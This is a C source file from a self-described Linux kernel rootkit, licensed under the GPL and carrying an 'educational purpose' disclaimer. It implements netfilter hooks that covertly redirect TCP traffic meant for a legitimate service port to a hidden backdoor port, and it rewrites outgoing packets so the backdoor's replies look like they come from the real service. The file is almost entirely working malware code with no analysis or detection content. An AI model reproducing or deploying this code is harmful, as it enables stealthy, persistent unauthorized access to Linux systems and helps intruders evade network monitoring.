/* 
 * Copyright 2014-2015 Jerry Han (hanj4096@gmail.com)
 *
 * This program is free software; you can redistribute it and/or modify   
 * it under the terms of the GNU General Public License version 3 as 
 * published by the Free Software Foundation.
 *
 * Note: 
 * This kernel rootkit is just for educational purpose and it shouldn't
 * be used for any illegal activities, use this at your own risk.
 */

#include <linux/module.h>
#include <linux/string.h>
#include <linux/init.h>
#include <linux/version.h>
#if(LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,33))
    #include <generated/autoconf.h>
#else
    #include <linux/autoconf.h>
#endif
#include <net/tcp.h>
#include <linux/in.h>
#include <linux/vmalloc.h>
#include <linux/idr.h>
#include <linux/ctype.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/proc_fs.h>
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,29))
    #include <linux/cred.h>
#endif
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0))
    #include <linux/uidgid.h>
#endif
#include <linux/netfilter.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/netfilter_ipv4.h>
#include <linux/random.h>
#include <net/checksum.h>


#include <linux/jiffies.h>
#include <linux/types.h>
#include <linux/timer.h>
#include <linux/list.h>

#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    #include <linux/jhash.h>
    #include <net/checksum.h>
#endif

#include "common.h"

#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
static void update_ipv4_tcp_checksum(struct tcphdr *tcph, struct sk_buff *skb, struct iphdr *iph)
{
    unsigned int tcphoff = iph->ihl * 4;
    
    tcph->check = 0;
    skb->csum = skb_checksum(skb, tcphoff,
                     skb->len - tcphoff, 0);
    tcph->check = csum_tcpudp_magic(iph->saddr, iph->daddr,
                    skb->len - tcphoff,
                    iph->protocol,
                    skb->csum); 
    skb->ip_summed = CHECKSUM_UNNECESSARY;
}
#endif

#define HASH_SIZE 1024
#define TUPLE_TIMEOUT HZ * 60 * 2 
#define DNAT 1
struct tuple 
{
    struct hlist_node node;

    unsigned int saddr;
    unsigned short sport;
    unsigned char flag;
    unsigned long expires;
};
struct hlist_head tuple_list[HASH_SIZE];
DEFINE_SPINLOCK(tuple_list_lock);

#define WHITE_HOST_TIMEOUT  HZ * 60 * 1
#define HOST_TIMEOUT HZ * 60 * 10
struct host 
{
    struct hlist_node node;
    unsigned int saddr;
    unsigned long white_expires;
    unsigned char flag;
    unsigned long expires;
};
struct hlist_head host_list[HASH_SIZE];
DEFINE_SPINLOCK(host_list_lock);

uint32_t hash_num(uint32_t hash_seed, uint32_t num)
{
    return (jhash_1word(num, hash_seed) % HASH_SIZE);
}   
uint32_t hash_seed;

struct timer_list gc_timer;
static void gc_func(unsigned long data)
{
    struct tuple *tuple = NULL;
    struct host *host = NULL;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    struct hlist_node *pos = NULL, *n = NULL;
#else
    struct hlist_node *n = NULL;
#endif 
    int i = 0;

    spin_lock(&tuple_list_lock);
    for (i = 0; i < HASH_SIZE; i++) {
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
        hlist_for_each_entry_safe(tuple, pos, n, &tuple_list[i], node) {
#else
        hlist_for_each_entry_safe(tuple, n, &tuple_list[i], node) {
#endif 
            if (time_after(jiffies, tuple->expires)) {
                hlist_del(&tuple->node);
                kfree(tuple);
            }
        }
    }
    spin_unlock(&tuple_list_lock);
    
    spin_lock(&host_list_lock);
    // one phase ageout
    for (i = 0; i < HASH_SIZE; i++) {
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
        hlist_for_each_entry_safe(host, pos, n, &host_list[i], node){
#else
        hlist_for_each_entry_safe(host, n, &host_list[i], node){
#endif
            if (time_after(jiffies, host->expires)) {
                hlist_del(&(host->node));
                kfree(host);
            }
        }
    }
    spin_unlock(&host_list_lock);
    
    mod_timer(&gc_timer, jiffies + 30*HZ);
}

static void nat_tcp_ingress(struct sk_buff *skb, struct iphdr *iph, struct tcphdr *tcph)
{
    struct host *host = NULL;
    struct tuple *tuple = NULL;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    struct hlist_node *pos;
#endif
    unsigned int hash = 0, find = 0;

    if (ntohs(tcph->dest) != VICTIM_PORT) 
        return ;
    DEBUG_NF("\nentering %s: " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
    
    spin_lock(&host_list_lock);
    hash = hash_num(hash_seed, iph->saddr);
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    hlist_for_each_entry(host, pos, &host_list[hash], node){
#else
    hlist_for_each_entry(host, &host_list[hash], node){
#endif
        if(host->saddr == iph->saddr) {
            host->expires = jiffies + HOST_TIMEOUT;
            find = 1;
            DEBUG_NF("%s:find host, flag=%d, " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, host->flag, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
            break;
        } 
    }
    if (!find) {
        if ((host = kzalloc(sizeof(struct host), GFP_ATOMIC)) == NULL) {
            DEBUG_NF("%s: failed to alloc struct host\n", __func__);
            spin_unlock(&host_list_lock);
            goto nat_tcp_ingress_end;
        }
        host->saddr = iph->saddr;
        host->flag = DNAT;
        host->expires = jiffies + HOST_TIMEOUT;
        hlist_add_head(&host->node, &host_list[hash_num(hash_seed, host->saddr)]);
        DEBUG_NF("%s:create host, flag=%d,  " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, host->flag, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
    }

    if (tcph->syn) {
        DEBUG_NF("%s:syn, host flag=%d, " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, host->flag, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
        if(host->flag != DNAT && time_after(jiffies, host->white_expires)) {
            DEBUG_NF("%s:syn, host flag=%d, %ld %ld, " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, host->flag, jiffies, host->white_expires, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
            host->flag = DNAT;
        }   
        
        if (host->flag == DNAT) {
            if ((tuple = kmalloc(sizeof(struct tuple), GFP_ATOMIC)) == NULL) {
                DEBUG_NF("%s: failed to alloc struct tuple\n", __func__);
                spin_unlock(&host_list_lock);
                goto nat_tcp_ingress_end;
            }
            tuple->saddr = iph->saddr;
            tuple->sport = tcph->source;
            tuple->flag = host->flag;
            tuple->expires = jiffies + TUPLE_TIMEOUT;
            
            spin_lock(&tuple_list_lock);
            hlist_add_head(&tuple->node, &tuple_list[hash_num(hash_seed, tuple->saddr)]);
            spin_unlock(&tuple_list_lock);
            
            DEBUG_NF("%s:create tuple, flag=%d, " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, tuple->flag, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
        }
    }   
    spin_unlock(&host_list_lock);
    
    spin_lock(&tuple_list_lock);
    find = 0;
    hash = hash_num(hash_seed, iph->saddr);
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    hlist_for_each_entry(tuple, pos, &tuple_list[hash], node){
#else
    hlist_for_each_entry(tuple, &tuple_list[hash], node){
#endif
        if(tuple->saddr == iph->saddr && tuple->sport == tcph->source) {
            tuple->expires = jiffies + TUPLE_TIMEOUT;
            find = 1;
            DEBUG_NF("%s:find tuple, flag=%d, " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, tuple->flag, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
            break;
        }
    }
    
    if (find && tuple->flag == DNAT) {
        tcph->dest = htons(BACKDOOR_PORT);
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
        update_ipv4_tcp_checksum(tcph, skb, iph);
#else
        inet_proto_csum_replace2(&(tcph->check), skb, htons(VICTIM_PORT), htons(BACKDOOR_PORT), 0); 
#endif  
        DEBUG_NF("%s:dnat, " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
    }
    spin_unlock(&tuple_list_lock);

nat_tcp_ingress_end:
    DEBUG_NF("leaving %s: " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
}

static void nat_tcp_egress(struct sk_buff *skb, struct iphdr *iph, struct tcphdr *tcph)
{
    struct host *host = NULL;
    struct tuple *tuple = NULL;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    struct hlist_node *pos;
#endif
    unsigned int hash = 0, find = 0;

    if (ntohs(tcph->source) != BACKDOOR_PORT) 
        return ;    
    DEBUG_NF("\nentering %s: " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
    
    if (tcph->rst) {
        spin_lock(&host_list_lock);
        hash = hash_num(hash_seed, iph->daddr);
        find = 0;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
        hlist_for_each_entry(host, pos, &host_list[hash], node){
#else
        hlist_for_each_entry(host, &host_list[hash], node){
#endif
            if(host->saddr == iph->daddr) {
                host->expires = jiffies + HOST_TIMEOUT;
                find = 1;
                DEBUG_NF("%s: find host, flag = %d, " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, host->flag, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
                break;
            } 
        }
        if (find) {
            host->white_expires = jiffies + WHITE_HOST_TIMEOUT;
            host->flag = 0;
            DEBUG_NF("%s: rst change host flag = %d, " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, host->flag, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
        }
        spin_unlock(&host_list_lock);
    }   

    spin_lock(&tuple_list_lock);
    find = 0;
    hash = hash_num(hash_seed, iph->daddr);
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    hlist_for_each_entry(tuple, pos, &tuple_list[hash], node){
#else
    hlist_for_each_entry(tuple, &tuple_list[hash], node){
#endif
        if(tuple->saddr == iph->daddr && tuple->sport == tcph->dest) {
            tuple->expires = jiffies + TUPLE_TIMEOUT;
            find = 1;
            DEBUG_NF("%s:find tuple, flag=%d, " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, tuple->flag, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
            break;
        }
    }

    if (find && tuple->flag == DNAT) {
        tcph->source = htons(VICTIM_PORT);
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
        update_ipv4_tcp_checksum(tcph, skb, iph);
#else
        inet_proto_csum_replace2(&(tcph->check), skb, htons(BACKDOOR_PORT), htons(VICTIM_PORT), 0); 
#endif
        DEBUG_NF("%s: dnat by default, " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
    }   
    spin_unlock(&tuple_list_lock);

nat_tcp_egress_end:
    DEBUG_NF("leaving %s: " NIPQUAD_FMT " " NIPQUAD_FMT " %d %d\n", __func__, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), ntohs(tcph->source), ntohs(tcph->dest));
}

static void nat_init(void) 
{
    int i = 0;
    get_random_bytes(&hash_seed, 4);

    for(i = 0; i < HASH_SIZE; i++){
        INIT_HLIST_HEAD(&tuple_list[i]);
    }
    for(i = 0; i < HASH_SIZE; i++){
        INIT_HLIST_HEAD(&host_list[i]);
    }

    init_timer(&gc_timer);
    gc_timer.expires = jiffies + 30*HZ;
    gc_timer.data = 0;
    gc_timer.function = gc_func;
    add_timer(&gc_timer);
}

static void nat_cleanup(void)
{
    struct tuple *tuple = NULL;
    struct host *host = NULL;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    struct hlist_node *pos = NULL, *n = NULL;
#else
    struct hlist_node *n = NULL;
#endif

    int i;
    spin_lock(&tuple_list_lock);
    for(i = 0; i < HASH_SIZE; i++){
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
        hlist_for_each_entry_safe(tuple, pos, n, &tuple_list[i], node){
#else
        hlist_for_each_entry_safe(tuple, n, &tuple_list[i], node){
#endif
            hlist_del(&tuple->node);
            kfree(tuple);
        }
    }
    spin_unlock(&tuple_list_lock);
    
    spin_lock(&host_list_lock);
    for(i = 0; i < HASH_SIZE; i++){
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
        hlist_for_each_entry_safe(host, pos, n, &host_list[i], node){
#else
        hlist_for_each_entry_safe(host, n, &host_list[i], node){
#endif
            hlist_del(&host->node);
            kfree(host);
        }
    }
    spin_unlock(&host_list_lock);
    
    del_timer_sync(&gc_timer);  
}

static unsigned int nf_ingress(
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
                        unsigned int hooknum,
                        struct sk_buff **pskb,
#else
                        const struct nf_hook_ops *ops,
                        struct sk_buff *skb,
#endif
                        const struct net_device *in,
                        const struct net_device *out,
                        int (*okfn)(struct sk_buff *))
{
    struct iphdr *iph;
    struct tcphdr *tcph;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    struct sk_buff * skb = *pskb;
#endif

    if(skb_linearize(skb) != 0) 
        return NF_ACCEPT;

    if(unlikely(skb->protocol != htons(ETH_P_IP))){
        return NF_ACCEPT;
    }

#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    iph = (struct iphdr *)skb->data;
#else
    iph = ip_hdr(skb);
    if(unlikely(!iph)) {
        return NF_ACCEPT;
    }
#endif

    if (unlikely(iph->frag_off & htons(IP_MF|IP_OFFSET)) ) {
        return NF_ACCEPT;
    }
    
    if(iph->protocol == IPPROTO_TCP){
        if (skb->len < (iph->ihl*4 + sizeof(struct tcphdr)))
            return NF_ACCEPT;
        tcph = (struct tcphdr*)(skb->data + 4*iph->ihl);
        if (skb->len < (iph->ihl*4 + tcph->doff*4))
            return NF_ACCEPT;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
        if (!skb_make_writable(pskb, iph->ihl*4 + tcph->doff*4))
#else
        if (!skb_make_writable(skb, iph->ihl*4 + tcph->doff*4))
#endif
            return NF_ACCEPT;

        nat_tcp_ingress(skb, iph, tcph);
    }
    
    
    return NF_ACCEPT;
}

static unsigned int nf_egress(
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
                            unsigned int hooknum,
                            struct sk_buff **pskb,
#else
                            const struct nf_hook_ops *ops,
                            struct sk_buff *skb,
#endif
                            const struct net_device *in,
                            const struct net_device *out,
                            int (*okfn)(struct sk_buff *))
{
    struct iphdr *iph;
    struct tcphdr *tcph;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    struct sk_buff * skb = *pskb;
#endif

    if(skb_linearize(skb) != 0) 
        return NF_ACCEPT;

    if(unlikely(skb->protocol != htons(ETH_P_IP))){
        return NF_ACCEPT;
    }

#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    iph = (struct iphdr *)skb->data;
#else
    iph = ip_hdr(skb);
    if(unlikely(!iph)) {
        return NF_ACCEPT;
    }
#endif

    if (unlikely(iph->frag_off & htons(IP_MF|IP_OFFSET)) ) {
        return NF_ACCEPT;
    }
    
    if(iph->protocol == IPPROTO_TCP){
        if (skb->len < (iph->ihl*4 + sizeof(struct tcphdr)))
            return NF_ACCEPT;
        tcph = (struct tcphdr*)(skb->data + 4*iph->ihl);
        if (skb->len < (iph->ihl*4 + tcph->doff*4))
            return NF_ACCEPT;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
        if (!skb_make_writable(pskb, iph->ihl*4 + tcph->doff*4))
#else
        if (!skb_make_writable(skb, iph->ihl*4 + tcph->doff*4))
#endif
            return NF_ACCEPT;

        nat_tcp_egress(skb, iph, tcph);
    }
    
    
    return NF_ACCEPT;
}

static struct nf_hook_ops hook_ops[] __read_mostly =
{
    {
        .hook = nf_ingress,
        .owner = THIS_MODULE,
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
        .pf = PF_INET,
        .hooknum = NF_IP_PRE_ROUTING,
#else
        .pf = NFPROTO_IPV4,
        .hooknum = NF_INET_PRE_ROUTING,
#endif
        .priority = NF_IP_PRI_NAT_DST - 10,
    },
    {
        .hook = nf_egress,
        .owner = THIS_MODULE,
#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
        .pf = PF_INET,
        .hooknum = NF_IP_POST_ROUTING,
#else
        .pf = NFPROTO_IPV4,
        .hooknum = NF_INET_POST_ROUTING,
#endif
        .priority = NF_IP_PRI_NAT_SRC - 10,
    },
};

void nf_hook_init(void)
{
    nf_register_hooks(hook_ops, ARRAY_SIZE(hook_ops));
    nat_init();
}

void nf_hook_cleanup(void)
{
    nf_unregister_hooks(hook_ops, ARRAY_SIZE(hook_ops));
    nat_cleanup();
}
